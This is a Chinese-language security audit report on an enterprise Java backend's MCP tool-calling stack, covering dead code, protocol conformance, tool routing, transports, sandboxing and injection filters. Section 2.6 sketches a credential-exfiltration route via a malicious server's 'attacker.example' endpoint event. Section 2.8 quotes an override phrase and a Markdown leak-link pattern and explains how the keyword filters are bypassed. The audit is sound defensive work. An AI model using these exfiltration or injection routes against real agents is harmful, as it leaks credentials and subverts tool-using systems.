# 企业级 MCP 工具生态与工具调用安全审计报告

- 任务：task-4（MCP 工具生态与工具安全审计员）
- 审计日期：2026-10-19（Asia/Shanghai）
- 代码基线：`backend/` 工作区当前未提交状态（只读，未执行 mvn/gradle/服务启动）
- 外部规范基线：Model Context Protocol 官方规范站点，抓取日期 **2026-10-19**
- 交付约束：本文件是本次审计唯一写入的文件

---

## 0 阅读范围与方法

### 0.1 阅读范围与实际工作量

| 范围 | 文件数 | 行数 | 读法 |
|---|---|---|---|
| `backend/qknow-mcp/**`（core/client/server 三模块 `src/main`） | 79 | 7,091 | 全量文件清单 + 关键类逐行精读（协议、传输、安全、路由、编排、server 侧全部 61 个文件逐个过目） |
| `backend/qknow-mcp` 契约测试 | 1 | 261 | 精读全部 4 个契约用例 |
| `backend/qknow-hermes/qknow-hermes-core/.../hermes/tool/**` | 65 | 9,978 | 生产链路类逐行精读（mcp/*、sandbox/*、governance/*、filter/*、db/*、function/*），Saga/Hoare 等旁支类按签名与调用点核对 |
| `backend/qknow-hermes/.../hermes/agent/**`（工具编排部分） | — | — | `WorkerAgent`、`AgentOrchestrator`、`AgentRegistry`、`ReActCycleGuard` 逐行核对 |
| `backend/qknow-framework/qknow-ai`（工具/模型适配） | — | — | `ToolCallbackResolverConfig`、`DefensiveToolExecutor`、`WebSearchToolFunction`、`common/security/ssrf/*` |
| `backend/qknow-module-kb` 中工具节点 | — | — | `ToolNodeBO`、`NodeFactory`、`HealthCheckController` 的装配关系 |
| MCP 相关测试 | 46 | — | 文件清单 + 关键契约测试精读 + `target/surefire-reports` 实际执行结果 |
| MCP 官方规范 | 4 页 | — | 规范首页、Lifecycle、Transports、Tools（URL 与抓取日期见附录 A.3） |

### 0.2 证据等级定义（全文严格遵守）

- **已验证**：由源码行、测试执行产物或官方规范原文直接证明，可直接复核。
- **推断**：由多行源码逻辑串起来的结论，未实际运行验证（受「禁止启动服务/长测试」约束）。
- **未知**：现有代码与产物无法判断，需运行时或外部输入才能确认。

### 0.3 路径缩写（全文引用统一使用）

| 缩写 | 实际路径 |
|---|---|
| `MCORE` | `backend/qknow-mcp/qknow-mcp-core/src/main/java/tech/qiantong/qknow/mcp/core` |
| `MCLI` | `backend/qknow-mcp/qknow-mcp-client/src/main/java/tech/qiantong/qknow/mcp/client` |
| `MSRV` | `backend/qknow-mcp/qknow-mcp-server/src/main/java/tech/qiantong/qknow/mcp/server` |
| `HP` | `backend/qknow-hermes/qknow-hermes-core/src/main/java/tech/qiantong/qknow/hermes/tool` |
| `HA` | `backend/qknow-hermes/qknow-hermes-core/src/main/java/tech/qiantong/qknow/hermes/agent` |
| `KB` | `backend/qknow-module-kb/qknow-module-kb-biz/src/main/java/tech/qiantong/qknow/module/kb` |
| `AI` | `backend/qknow-framework/qknow-ai/src/main/java/tech/qiantong/qknow/ai` |
| `CMN` | `backend/qknow-framework/qknow-common/src/main/java/tech/qiantong/qknow/common` |

---

## 1 真实执行路径

### 1.1 装配事实：`qknow-mcp` 79 个主代码文件几乎没有一条生产调用边

这是本次审计最重要、也最需要 Lead 立即知晓的结构性结论。

**已验证**：把 `qknow-mcp` 中全部被点名的核心类逐一到全仓检索引用方（排除自身与测试），结果如下（脚本：对 25 个类名做 `grep -rln` 后剔除 `/tests/`、`/src/test/`、自身定义文件）：

| 类 | 生产引用方 | 结论 |
|---|---|---|
| `McpClientManager` | 无（仅 `MCLI/adapter/McpSpringAiToolCallbackAdapter.java` 与其自身、测试） | 未被 Spring 装配 |
| `StdioEnterpriseTransport` / `EnterpriseMcpClientTransport` | 仅 `HP/mcp/StdioMcpClient.java`（构造） | 被 Hermes 间接使用 |
| `McpSpringAiToolCallbackAdapter` | 无 | 死代码 |
| `TwoStageDynamicToolRouter` / `ToolRagFilter` / `SemanticToolRegistry` | 无生产消费者 | 孤岛 Bean |
| `HighRiskToolSafetyGovernor` / `ToolchainDependencyDagGuard` / `StreamingToolchainFaultToleranceGovernor` / `CrossMicroserviceMcpTopologyRouter` / `McpOrchestrationControlBus` / `IdempotentToolExecutionGateway` / `TwoStageToolManifoldRouter` | 无生产消费者 | 孤岛 Bean / 死代码 |
| `ZeroTrustSandboxRuntime` / `McpSecurityFilterPipeline` / `McpRelayControlBus` / `StreamingMcpRelayGateway` / `TwoStageMcpSecurityGateway` / `DynamicMcpContractRegistry` | 无生产消费者 | 死代码 |
| `MSRV` 全部（QuadDefense、Lease、4 个 Provider、Registry、标注、OpenApi 适配器、两种 server transport） | 无生产消费者 | 整个 server 模块未进入运行时 |

**已验证的装配证据链**：

1. `backend/qknow-server/src/main/java/tech/qiantong/qknow/server/QKnowApplication.java:21-26`：`@ComponentScan(basePackages={"tech.qiantong"}, excludeFilters=@Filter(REGEX, "tech\\.qiantong\\.qknow\\.hermes\\..*"))` —— 扫描 `tech.qiantong.qknow.mcp.*`，**排除** `tech.qiantong.qknow.hermes.*`。
2. 因此 `MCLI` 中 7 个 `@Component` 会被实例化：`HighRiskToolSafetyGovernor:20`、`ToolchainDependencyDagGuard:14`、`StreamingToolchainFaultToleranceGovernor:15`、`CrossMicroserviceMcpTopologyRouter:15`、`McpOrchestrationControlBus:17`、`ToolRagFilter:16`、`SemanticToolRegistry:15`。但如 1.1 表所示**没有任何 Bean 注入它们**——它们只是被创建后闲置的孤岛。
3. `backend/qknow-server/pom.xml` 只依赖 6 个 `qknow-module-*` 与 `qknow-common`，**不依赖 `qknow-mcp-server`**；`qknow-mcp-server` 唯一的引用出现在 `backend/tests/pom.xml:84`。→ 平台自身**没有**任何生产态的 MCP Server 端点。
4. Hermes 侧相反：`backend/qknow-hermes/qknow-hermes-core/pom.xml:152-158` 依赖 `qknow-mcp-core` 与 `qknow-mcp-client`；`backend/qknow-server/.../config/HermesConfiguration.java:29-33` 用 `@Bean` 手工创建 `tech.qiantong.qknow.hermes.tool.mcp.McpToolAdapter`。**这是唯一跨过 hermes 扫描排除线的 MCP 入口。**

> 结论（已验证）：`qknow-mcp` 的 7,091 行主代码中，真正进入生产运行时的只有 `qknow-mcp-core` 的 DTO/协议记录，以及被 `StdioMcpClient` 复用的 `StdioEnterpriseTransport`（约 350 行）。其余约 6,700 行（92%）为未装配实现或死代码。这不是"实现质量"问题，而是"能力是否存在"的问题。

### 1.2 唯一真实生产链路（已验证）

```
前端工作流定义(KbFlowNodeDO.config.toolCode)
  └─ KB/service/flow/factory/NodeFactory → ToolNodeBO
       └─ HP/mcp/McpToolAdapter.executeTool(...)              (HP/mcp/McpToolAdapter.java:296)
            ├─ McpSchemaValidator.validate(...)               (:339)
            ├─ McpVirtualThreadCircuitBreaker.executeWithIsolation(...) (:346, :418)
            └─ McpClient.callTool(toolName, args)
                 ├─ StdioMcpClient   → StdioEnterpriseTransport.sendRequest  (HP/mcp/StdioMcpClient.java:146)
                 │     → 子进程 stdin/stdout，换行分隔 JSON-RPC
                 └─ HttpMcpClient    → POST + 可选 GET SSE           (HP/mcp/HttpMcpClient.java:244)
```

工具注册侧：全仓唯一注册入口是 `HP/mcp/McpToolAdapter.java:80-86` 的 `@PostConstruct initializeGithubServer()`，且仅在 `GITHUB_PERSONAL_ACCESS_TOKEN` 环境变量存在时注册一个 `npx -y @modelcontextprotocol/server-github`（`:181-188`）。全仓 **无任何 `application*.yml|properties` 中的 MCP 配置**（检索 `--include=*.yml|*.yaml|*.properties` 命中 0 条），也**没有** MCP Server 管理 API/数据库表。

> 结论（已验证）：**默认部署下 MCP 工具集为空**。所谓"企业 MCP 工具生态"当前实际入口是：一个 GitHub demo server + 工作流节点里手填的 `toolCode`。全链路中"发现→语义检索→路由→回执→可观测"五段没有生产实现。

### 1.3 全链路逐环节事实表

| 环节 | 生产是否存在 | 真实实现 | 证据 |
|---|---|---|---|
| 工具注册 | 部分 | 仅 `@PostConstruct` + 环境变量触发 1 个 server；无配置/DB/管理面 | `HP/mcp/McpToolAdapter.java:80-86,181-188` |
| 发现 `tools/list` | 是 | 单页拉取，忽略 `cursor` | `HP/mcp/StdioMcpClient.java:110-136`；`HP/mcp/HttpMcpClient.java:209-220` |
| 语义检索 | **否（形式存在）** | 索引时向量传 `null`；检索时全零向量 | `HP/mcp/McpToolAdapter.java:155`；`HP/mcp/governance/McpToolSemanticRetriever.java:62-78,115-124`；`HP/mcp/governance/McpTwoPhaseProjectionGovernor.java:202-218` |
| 路由 | **否** | `TwoStageDynamicToolRouter` 等 4 套路由均无生产消费者；`WorkerAgent` 的动态投影仅在 `context["queryEmbedding"]` 存在时触发，且同样吃零向量 | `MCLI/routing/TwoStageDynamicToolRouter.java:77`；`HA/WorkerAgent.java:95-107`；`HP/tool/discovery/ToolDiscoveryService.java:73-79` |
| 参数绑定 | 部分 | 有自研 JSON Schema 轻校验（required/type），无 `additionalProperties`、enum、格式、数组元素校验 | `HP/mcp/McpSchemaValidator.java:41-110`；`HP/mcp/McpToolAdapter.java:336-344` |
| 执行 `tools/call` | 是（via Hermes） | 裸 JSON-RPC POST / stdio；无 `_meta`、无 progressToken、无取消 | `HP/mcp/StdioMcpClient.java:139-165`；`HP/mcp/HttpMcpClient.java:222-228` |
| 结果回执 | 部分 | 记录类存在（`McpExecutionReceipt`、`McpToolProjectionReceipt`、`McpZeroTrustGatewayReceipt`…），但执行路径不签发、不落库、不入 trace | `MCLI/model/McpExecutionReceipt.java`（无引用方）；`HP/mcp/governance/McpToolProjectionReceipt.java`（仅 `ToolDiscoveryService` 内存回填） |
| 可观测 | **否** | 无 OpenTelemetry/Micrometer/审计表；`McpDiscoveryReport`（`MCLI/lifecycle/McpDiscoveryReport.java`）仅内存对象且无消费者 | `MCLI/lifecycle/McpDiscoveryReport.java:9-17` |

### 1.4 Hermes 与 MCP 是否两套并行/重复实现？——是，且是"四套"

**已验证**：全仓存在 **3 个 `McpToolAdapter`** + 1 个 Spring AI 回调适配器：

1. `HP/mcp/McpToolAdapter.java`（430 行，`@Component` + `HermesConfiguration` @Bean）——**唯一生产使用**。
2. `KB/tool/mcp/McpToolAdapter.java:16-21`——标注 `@Deprecated`、注释"请统一使用 hermes 版本"，且无 `@Component`，未被装配。
3. `MCLI/adapter/McpSpringAiToolCallbackAdapter.java`（88 行）——未装配。
4. `MSRV/adapter/OpenApiToMcpToolAdapter.java`（301 行）——未装配，且内含**伪 embedding**（见 2.4）。

同时存在 **2 套 MCP 客户端**（`MCLI/McpClientManager` + `MCORE/transport/StdioMcpSession` 与 `HP/mcp/{McpClient,StdioMcpClient,HttpMcpClient}`）、**2 套 MCP 服务端抽象**（`MSRV` 全套 vs `HP/mcp/McpToolAdapter` 自建 registry）、**3 套安全管线**（`MSRV/security/QuadDefenseSecurityPipeline`、`MCLI/security/McpSecurityFilterPipeline`、`HP/mcp/filter/McpSecurityPipelineFilter`）、**4 套工具路由**（`MCLI/routing/TwoStageDynamicToolRouter`、`MCLI/orchestration/engine/TwoStageToolManifoldRouter`、`HP/mcp/governance/McpToolSemanticRetriever`+`McpTwoPhaseProjectionGovernor`、`MCORE/router/McpHierarchicalVoronoiRouter`）、**3 套断路器**（`McpVirtualThreadCircuitBreaker`、`StreamingToolchainFaultToleranceGovernor`、`HP/mcp/gateway/AdaptiveMcpCircuitBreakerGovernor`）、**2 套审批**（`HighRiskToolSafetyGovernor`、`HP/mcp/filter/McpTwoPhaseApprovalGovernor`）、**2 套沙箱**（`MCLI/gateway/ZeroTrustSandboxRuntime`、`HP/mcp/sandbox/EphemeralToolSandboxRuntime`）。

> 结论（已验证）：这不是"分层清晰的多层实现"，而是**同名能力的历史并行堆积**。除 `HP/mcp/McpToolAdapter` 外，其余同名组件互不相识、无装配、无一致性测试。任何基于"平台已有 X 能力"的架构叙事都需要先按本表逐项降级为"存在代码但未生效"。

---

## 2 协议一致性与安全评估

### 2.1 协议版本：双轨、且整体落后 4 个规范代际

**已验证的版本硬编码**：

| 位置 | 声明版本 | 角色 |
|---|---|---|
| `MCLI/McpClientManager.java:94` | `2024-11-05` | client initialize |
| `MCORE/model/InitializeResult.java:15` | `2024-11-05` | server initialize 应答 |
| `HP/mcp/StdioMcpClient.java:30` | `2024-11-05` | stdio client initialize |
| `HP/mcp/HttpMcpClient.java:197` | `2025-03-26` | HTTP client initialize |

同一进程对 stdio 与 HTTP 两种 MCP server **声明了两个不同协议版本**，且反序列化到同一个 `JsonRpcResponse`/`InitializeResult` 模型（`MCORE/protocol/JsonRpcResponse.java`），不存在按版本分支处理的代码。

官方规范事实（抓取 2026-10-19）：
- 规范首页当前默认版本为 **2026-07-28**（<https://modelcontextprotocol.io/specification/>，页面跳转 `2026-07-28`），并列出 **2025-06-18** 等历史版本（<https://modelcontextprotocol.io/specification/2025-06-18/basic/lifecycle>）。
- Lifecycle 页明确：`initialize` **MUST** 是 client/server 第一次交互，client **MUST** 携带 `protocolVersion`/`capabilities`/`clientInfo`，server **MUST** 返回自身 capabilities；页面设有独立 **Version Negotiation** 小节（同上 URL）。
- Transports 页明确：Streamable HTTP **替换**了 2024-11-05 的 HTTP+SSE 传输（<https://modelcontextprotocol.io/specification/2025-06-18/basic/transports>）。

**推断（代码级）**：`HP/mcp/HttpMcpClient` 声明 `2025-03-26`，但实现仍是 2024-11-05 的"GET /sse + `endpoint` 事件 + POST 该 endpoint"双端点模型（`HP/mcp/HttpMcpClient.java:78-143,112-113,326-334`），并非 Streamable HTTP 的单端点多路复用；`initialize` 之后也不读 `Mcp-Session-Id` 之外的任何会话语义（仅 `:263-272` 透传）。

**推断（代码级）**：`initialize` 应答的 `protocolVersion` 被直接丢弃——`HP/mcp/StdioMcpClient.java:79-86` 只检查 `response.error()!=null`，从不校验 server 返回版本是否为自己支持的版本；规范要求 client 在 server 返回不支持版本时终止连接。`MCLI/McpClientManager.java:99-113` 虽把 `InitializeResult` 反序列化出来，但同样不做版本判定。

> 风险等级判断：单机 demo 可用，接入真实第三方 MCP Server（多数已升级到 2025-06-18/2026-07-28）时会出现"握手成功但语义不同"的静默不兼容——例如 server 按新规范只接受 Streamable HTTP 单端点、要求 `MCP-Protocol-Version` 头、或要求 `Origin` 校验，当前 client 都不满足。

### 2.2 能力协商、通知、进度、取消、分页、错误码

| 协议要求 | 实现状态 | 证据 |
|---|---|---|
| client 声明能力必须与实际实现一致 | **不符合**：`MCLI/McpClientManager.java:95` 声明 `roots.listChanged=true`，全仓无 `roots/list` 处理；`HP/mcp/StdioMcpClient.java:76` 声明空 capabilities（更保守，反而合规） | 同左 |
| server 声明 tools/resources/prompts 能力 | 形式符合：`MCORE/model/InitializeResult.java:17-19` 返回 `tools.listChanged=true`、`resources.subscribe=false`、`prompts.listChanged=true` | 同左 |
| `notifications/initialized` | 已发送 | `HP/mcp/StdioMcpClient.java:84-85`；`MCLI/McpClientManager.java:111` |
| server→client 通知（`tools/list_changed`、`notifications/progress`、`notifications/message`） | **不支持**：stdio 读循环把每一行强制解析为 `JsonRpcResponse`（`MCLI/client/.../StdioEnterpriseTransport.java:115`），通知报文会因缺 `result/error` 字段或未知属性解析失败，被 `catch` 后仅 `log.debug` 丢弃（`:125-127`） | 同左 |
| server→client 请求（`sampling/createMessage`、`roots/list`、`elicitation/create`） | **不支持**：同上，且 `pendingRequests` 只有 client 侧 key；`MCLI/McpClientManager$ClientSessionHolder.onMessageReceived` 只处理 `JsonRpcResponse`（`McpClientManager.java:44-51`） | 同左 |
| `ping` 工具方法 | client 有（`StdioEnterpriseTransport.java:234-239`），server 无（`MSRV/registry/McpServerRegistry.java:129-205` 的 switch 无 `ping` 分支）→ 互 ping 会得到 `-32601` | 同左 |
| 进度 `progressToken` + `notifications/progress` | **完全缺失**（全仓 grep 无 `progressToken`） | — |
| 取消 `notifications/cancelled` | **缺失**：超时只做 `future.cancel(true)`（`HP/mcp/governance/McpVirtualThreadCircuitBreaker.java:199-203`），不向 server 发送取消；`HttpMcpClient.disconnect()` 误把取消通知当"无参通知"发送（`HP/mcp/HttpMcpClient.java:230-237`，缺 `requestId`/`reason`） | 同左 |
| 分页 `cursor`/`nextCursor` | **缺失**：client `tools/list` 固定 `Map.of()`（`MCLI/McpClientManager.java:134`；`HP/mcp/StdioMcpClient.java:113`；`HP/mcp/HttpMcpClient.java:211`），server 返回 `Map.of("tools", list)` 无 `nextCursor`（`MSRV/registry/McpServerRegistry.java:134-137`） | 同左 |
| 错误码 | 仅用 JSON-RPC 标准 5 个 + 自造 `-32001`（`MCORE/protocol/JsonRpcError.java:13-18`）；MCP 定义的工具执行错误应用 `CallToolResult.isError` 表达，`McpClientManager` 把 JSON-RPC error 压成文本（`McpClientManager.java:186-188`），丢失 code | 同左 |
| `_meta` 字段 | 模型完全不支持（`McpTool`/`McpResource`/`McpPrompt` 均为窄 record），且 Jackson 默认 `FAIL_ON_UNKNOWN_PROPERTIES=true` 会把含 `_meta` 的报文解析失败 | `MCORE/model/McpTool.java:8-12`；`MCLI/client/.../StdioEnterpriseTransport.java:115` |

### 2.3 tools / resources / prompts 的数据模型覆盖度

对照 Tools 规范页（<https://modelcontextprotocol.io/specification/2025-06-18/server/tools>，抓取 2026-10-19）列出的数据类型：Text / Image / Audio / Resource Links / Embedded Resources / Structured Content / Output Schema / Tool annotations。

| 规范项 | 实现 | 证据 |
|---|---|---|
| text content | 支持 | `MCORE/model/ToolContentItem.java:6-9`（仅 `type`+`text`） |
| image / audio / resource_link / embedded resource | **不支持**（record 只有 `type`/`text` 两个字段，二进制内容无法表达） | 同上 |
| `outputSchema` / `structuredContent` | **不支持** | `MCORE/model/McpTool.java:8-12`；`MCORE/model/CallToolResult.java:8-11` |
| tool annotations（`readOnlyHint`/`destructiveHint`/`idempotentHint`/`openWorldHint`/`title`） | **不支持**；改用自造 `@McpTool.riskLevel`/`requiresLease`（`MSRV/annotation/McpTool.java:26-31`） | — |
| server 在 `tools/list` 返回的 tool 字段 | 额外污染了非 JSON-Schema 顶层键 `requiresLease`/`riskLevel`（`MSRV/registry/McpServerRegistry.java:77-79`），会被严格校验的 client 判为非法 schema | 同左 |
| tools capability 声明 | 有，但 `listChanged` 声明为 true 而实际从不发送该通知（`InitializeResult.java:17` vs 全仓无 `notifications/tools/list_changed` 发送点） | — |
| resources（list/read/templates） | list/read 有；**`resources/templates/list` 无**，而 `registerResource` 允许 URI 模板（`MSRV/registry/McpServerRegistry.java:86-91`）→ 模板资源无法被 client 发现 | — |
| prompts（list/get） | 有，无分页、无 `title`/`icons` | `MSRV/registry/McpServerRegistry.java:183-201` |

### 2.4 工具选择算法质量：召回名存实亡，"千问 1536 维超球面"实为零向量/伪随机向量

这是本次审计的**最高优先级质量问题**，直接否定了"语义路由"这一核心叙事。

**(a) 生产路径：索引时向量恒为 `null` → 检索时全零向量**

- `HP/mcp/McpToolAdapter.java:155`：`semanticRetriever.indexTool(toolCode, description, inputSchema, null)` —— 第 4 个参数（vector）**硬编码 null**。
- `HP/mcp/governance/McpToolSemanticRetriever.java:73-78`：仅当 `vector != null && length==1536` 才写入 `toolVectors`，否则只写 metadata 并 `log.warn`。→ `toolVectors` **永远为空**。
- 同文件 `:115-124`：`if (toolVectors.isEmpty()) return List.copyOf(toolMetadataMap.keySet())` —— 直接返回**全部工具**，不做 Top-K，也不做相似度。所谓"语义检索"退化为"全量返回"。
- 即便 queryVector 合法，客户端契约也拿不到真实工具向量；只有 `projectTools(queryVector,k)` 被 `McpToolAdapter.projectToolsWithReceipt`（`:251-267`）调用，而该方法的两个上游（`ToolDiscoveryService`、`WorkerAgent`）都传 `null`。

**(b) 生产路径（WorkerAgent 动态投影）：全零向量导致相似度恒 0**

- `HP/tool/discovery/ToolDiscoveryService.java:69-79`：同步工具元信息时，第 4 个参数注释写着"内部自动平滑占位或归一化"，实参为 `null`。
- `HP/mcp/governance/McpTwoPhaseProjectionGovernor.java:202-205`：`normalizeVector(null)` 返回 `new float[1536]` —— **全零向量**。
- 同文件 `:106-117`：`dotProduct(全零, 全零)=0.0` → 所有工具余弦 0 → `sort` 后候选顺序 = `ConcurrentHashMap` 迭代顺序（hash 顺序）→ **Top-K 实际是"hash 序前 K 个"**，与用户意图无关（推断：由 `:79-87` + `:106-117` 逻辑串联得出，未运行验证）。

**(c) OpenAPI 动态适配：用 SHA-256 种子高斯随机向量冒充"千问 embedding"**

- `MSRV/adapter/OpenApiToMcpToolAdapter.java:269-296`：`generateDeterministicHypersphericalEmbedding(seedText)` 以 SHA-256 前 8 字节为种子、Box-Muller 生成 1536 维高斯向量并归一化 —— 这是**伪随机投影**，与文本语义无关。
- 同文件 `:113-114` 将其用于 `DynamicOpenApiEndpoint` 与 `McpToolDescriptor`，`MCLI/routing/TwoStageDynamicToolRouter.java:118-125` 直接用它做余弦/测地排序。
- `backend/qknow-mcp/qknow-mcp-client/src/test/java/tech/qiantong/qknow/mcp/McpEcosystemContractTest.java:159-171`（契约三）用**同一个函数**同时生成"工具向量"与"查询向量"，因此断言必然通过——测试证明的是"哈希自相似"，不是"语义相关"。

**(d) 规模退化与开销结论**

- 真实生产路径没有 embedding 调用（因为向量恒 null）→ **零 embedding 成本，也零语义收益**。
- 若把 `TwoStageDynamicToolRouter` 接通：单次路由 O(N·1536) 双精度点积 + 每候选一次 `Math.acos`（`TwoStageDynamicToolRouter.java:119-125`）；对排序而言 `acos` 是单调变换，纯属浪费（推断）。1,000 工具约 1.5M 次乘加 + 1,000 次 acos，毫秒级可达，但**前提是工具向量真实存在**——当前没有任何代码负责"调用 Qwen Embedding 生成工具向量"，这是能力缺口而非性能问题。
- `MCLI/routing/SemanticToolRegistry.java:20-26` 每次注册都 `CopyOnWriteArrayList.removeIf` + `add` → 批量注册 O(N²) 元素拷贝；`ToolRagFilter.java:44-51` 无阈值预筛的线性扫描。二者均未装配。

### 2.5 stdio 传输健壮性

| 检查项 | 结论 | 证据 |
|---|---|---|
| 换行分隔、UTF-8 | 符合规范 | `MCLI/.../StdioEnterpriseTransport.java:91-93,202-206` |
| 子进程 stderr 排空（防死锁） | 已实现（虚拟线程 + 50 行环形缓冲） | `:98-100,138-151` |
| 僵尸进程/进程树回收 | 部分：先 `descendants().destroyForcibly()` 再 `process.destroyForcibly()`，`waitFor(300ms)`；若 300ms 内未回收则无二次等待（Java 有 reaper 线程兜底，残留风险低但非零） | `:320-335` |
| stdout 协议纯净性 | client 侧要求 server 不污染 stdout，但 server 侧 `MSRV/transport/StdioServerEnterpriseTransport.java:80-90` 用 `System.out.println` 写响应，而 Spring Boot 默认日志也走 stdout → 一旦启用必然污染协议流（推断） | 同左 |
| 请求-响应 id 关联 | **存在断裂（P1，推断）**：`MCLI/.../StdioEnterpriseTransport.java:248-250` 的 `send(McpMessage)` 把 `JsonRpcRequest` 转交给 `sendRequest(method,params)`，后者在 `:187-188` **重新生成 UUID**；而 `MCLI/McpClientManager$ClientSessionHolder.sendRequest`（`:53-66`）把 future 存在**旧 id** 下，且 `:44-51` 只按响应 id 匹配 → 走 `McpSession.send` 路径的请求永远不会完成，必然 5s/8s 超时。当前 `McpClientManager` 未装配，故为潜伏缺陷；一旦接线即 100% 触发 | 同左 |
| 背压 | 有信用信号量（W_max=16，`tryAcquire(500ms)`），超时即快速失败 | `:172-185` |
| 背压信用泄漏 | **有**：信用在 `future.whenComplete` 归还（`:194-198`），但没有任何超时机制保证 future 完成；若响应行解析失败（见下）或 server 不回包，则信用永久泄漏，**连续 16 次后传输层永久不可用** | `:175,190-198` |
| 报文解析容错 | **有（P1）**：`ObjectMapper` 为默认配置（`new ObjectMapper()`，`:40,70`），`JsonRpcResponse` record 未加 `@JsonIgnoreProperties(ignoreUnknown=true)`（`MCORE/protocol/JsonRpcResponse.java:10-15`）→ 任何符合规范的扩展字段（如 `_meta`）都会抛 `UnrecognizedPropertyException`，被 `:125-127` 吞掉 → 对应请求永不完成 | 同左 |
| 单行长度上限 | 无（`BufferedReader.readLine` 无界，恶意 server 可发送超长行耗尽内存） | `:109` |

### 2.6 HTTP 传输（SSE/Streamable）健壮性与安全

`HP/mcp/HttpMcpClient.java` 的实现事实：

1. **协议错配**：声明 `2025-03-26`（`:197`），却用 2024-11-05 的 GET-SSE + `endpoint` 事件模型（`:78-143`）。规范要求 Streamable HTTP 用单一 endpoint 同时支持 POST/GET、`Mcp-Session-Id`、可选 SSE 响应流、`Origin` 校验、`MCP-Protocol-Version` 头（Transports 页，抓取 2026-10-19）。
2. **无重连**：SSE `onError/onComplete` 只把 `sseConnected=false`（`:127-136`），无退避重连、无 `Last-Event-ID` 断点续传（规范"Resumability and Redelivery"）。
3. **无请求级取消/超时传播**：POST 超时固定 30s（`:259`），无 cancellation。
4. **`isConnected()` 恒真**：`return httpClient != null;`（`:239-242`）→ 健康检查无意义，上层无法感知断连。
5. **采样应答发送方式错误（P1）**：`handleIncomingSseMessage` 收到 `sampling/createMessage` 后，把带 `id` 的响应体塞进 `notifications/message` 通知发送（`:154-166`）——JSON-RPC 响应必须是 response 报文（同 id + result），用通知发送等于 server 永远收不到采样结果。
6. **SSRF/凭据外泄面（P1，推断）**：POST 目标由 server 下发的 `endpoint` 事件决定（`:112-113`），并在 `:326-334` 直接 `URI.create(ssePostEndpoint)`；发送时 `applyHeaders` 会把 `Authorization: Bearer <apiKey>` 与所有自定义头附上（`:317-324`）。恶意 MCP server 只需返回 `event: endpoint / data: https://attacker.example/` 即可把平台凭据与工具参数外发。无 scheme/域白名单校验。

### 2.7 沙箱与零信任的真实边界：**没有内核级隔离**

对三个"沙箱"逐一核验：

| 组件 | 隔离手段 | 真实边界 | 是否装配 |
|---|---|---|---|
| `MCLI/gateway/ZeroTrustSandboxRuntime` | 环境变量白名单（`:60-76`）、命令正则黑名单（`:34-36,100-105`）、`FutureTask`+看门狗 `interrupt()`（`:116-142`） | **同 JVM 平台线程**执行 `Callable`，继承进程全部权限：可读写任意文件、可联网、可读 `System.getenv`；`interrupt()` 无法中断阻塞 IO；`sandboxWorkingDir`（`:41-51`）创建后**从未用于约束任务**。宣称"外泄概率严格等于 0.0%"（`:14`）无实现支撑 | 否 |
| `HP/mcp/sandbox/EphemeralToolSandboxRuntime` | 真子进程 + `pb.environment().clear()`（`:130`）+ 白名单重建（`:37-39,102-125`）+ 独立临时 cwd（`:111-127`）+ 虚拟线程排空与 64KB 截断（`:145-176`）+ 看门狗 `destroyForcibly`（`:147-155`） | **进程级**隔离：无 chroot/namespace/seccomp/cgroup、无用户降权、无网络隔离、无 CPU/内存/进程数限制。子进程可读 `/etc/passwd`、可发起任意出网连接、可 fork 炸弹 | 否（仅被同样未装配的 `ZeroTrustToolProxyMetacenter` 使用） |
| `MCLI/.../QuadDefenseSecurityPipeline` 防线四 | `pb.environment().clear()` + `PATH=/usr/bin:/bin`（`:129-137`） | **未接入任何真实 spawn**：真实 stdio 启动在 `StdioEnterpriseTransport.java:81-90`，只做 `putAll(environment)`，**从不清空父环境** → 子进程 100% 继承 `DEEPSEEK_API_KEY`、数据库口令等宿主密钥 | 否 |

> 结论（已验证）：组件级证据显示"清空环境变量"的代码存在，但**真实的子进程启动路径没有调用它**。因此"凭据零外泄"当前是不成立的；这属于"声明与实现脱节"，比"实现不完善"更需要在对外表述上纠正。

补充事实：`ToolchainDependencyDagGuard` 宣称 `P(Deadlock)=0`（`MCLI/orchestration/engine/ToolchainDependencyDagGuard.java:11-13`），实际只做 Kahn 拓扑排序与"最小耦合边切断"（`:47-90`）；破坏环后**永久修改内存中的边集合**（`:70`）且仅 `debug` 记录切了哪条边；兜底分支把所有未解耦边全部切断后 `return new ArrayList<>(tools)`（`:83-89`）——把插入序当作拓扑序返回。该守卫无任何调用方，DAG 依赖语义在生产中不存在。

### 2.8 安全防护的真实防护项（逐条核对声明）

| 声明（代码注释） | 真实实现 | 可绕过性 | 证据 |
|---|---|---|---|
| 四防线·模式防线 16KB | `byte[].length > 16*1024` 抛异常 | 对**整个 JSON-RPC 请求**限长；工具结果大者直接被拒，且与 `MAX_STDOUT_BYTES=64KB`（`HP/.../EphemeralToolSandboxRuntime.java:31`）、`16000` 字符截断（`MCLI/security/McpSecurityFilterPipeline.java:78-79`）三处阈值互不一致 | `QuadDefenseSecurityPipeline.java:24,48-57` |
| 四防线·租约防线 | 高危工具要求 `arguments.leaseToken`，60s、单次 CAS 核销 | **租约令牌由模型/调用方放进工具参数**（`:63-64`），会出现在模型上下文、日志（`:75` 明文打印 token）与转发的 provider 参数中；租约只绑定 `toolName`，不绑定 user/tenant/session；`issueLease` 无鉴权（`McpTransientLeaseManager.java:39-57`）；`containsKey`+`get` 竞态可致 NPE（`:63-67`） | 同左 |
| 四防线·免疫防线 | 7 条英文关键词黑名单（`:29-37`）+ 出参正则脱敏 | 大小写/同义词/中文/零宽字符/Base64 均可绕过；**出参替换有实现 bug**：`:111` 用 `lower` 判定，`:115` 却用原始 `text` 调用 `text.replace(pattern,...)`，大写变体（如 `Ignore Previous Instructions`）替换必然失败 | 同左 |
| 四防线·环境防线 | 见 2.7 | 未接入 | — |
| 间接注入四道纵深（client） | 1 条正则（`:18-20`）、手机号/身份证脱敏、Markdown 外发链接条件阻断（`contains("![") && contains("?leak=")`）、16KB 截断 | "免疫记忆账本"把命中正则的片段当抗原（`:60-63`），会导致**任何包含该短语的合法输出被永久全量拦截**；链接阻断要求同时出现两个特征串，绕过成本极低 | `MCLI/security/McpSecurityFilterPipeline.java:32-83` |
| Hermes 双向过滤 | 入参 `replaceAll("[;&|`$]","")` | 直接**破坏合法数据**（SQL/代码/password 含 `$`、`|` 被静默篡改），且不拦截换行、Unicode、`\n` 注入；未装配 | `HP/mcp/filter/McpSecurityPipelineFilter.java:32-48` |
| 提示注入防护 | 关键词黑名单 | 同上 | 各管线 |
